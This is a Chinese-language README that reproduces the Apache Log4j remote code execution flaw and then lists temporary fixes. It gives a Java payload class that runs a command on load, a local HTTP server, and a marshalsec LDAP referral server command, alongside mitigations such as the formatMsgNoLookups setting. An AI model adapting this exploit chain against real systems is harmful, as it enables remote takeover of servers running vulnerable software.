# Apache-Log4j
[Apache Log4j 远程代码执行](https://github.com/askDing/apache-log4j-poc)

> 攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响

![image](https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png)

## 复线步骤
### 编译exp-修改Log4jRCE.java
``` java
public class Log4jRCE {
    static{
        try{
            String[] cmd={"open","/System/Applications/Calculator.app"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```
### python起个本地简易web服务
在target/classes目录下执行 `python3 -m http.server 8888`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134009.png)

### 在本地起一个ldap服务
`java  -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210141034.png)

### 运行log4j.java程序
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134659.png)

## 临时修复方案：

（1）修改jvm参数
-Dlog4j2.formatMsgNoLookups=true

（2）修改配置
在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true


①在jvm启动参数中添加

`-Dlog4j2.formatMsgNoLookups=true`

![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210151940.png)


②系统环境变量中配置

`FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS=true`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152021.png)


③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置`log4j2.formatMsgNoLookups=true`
![](https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152139.png)

- 限制受影响应用对外访问互联网
- WAF添加漏洞攻击代码临时拦截规则。
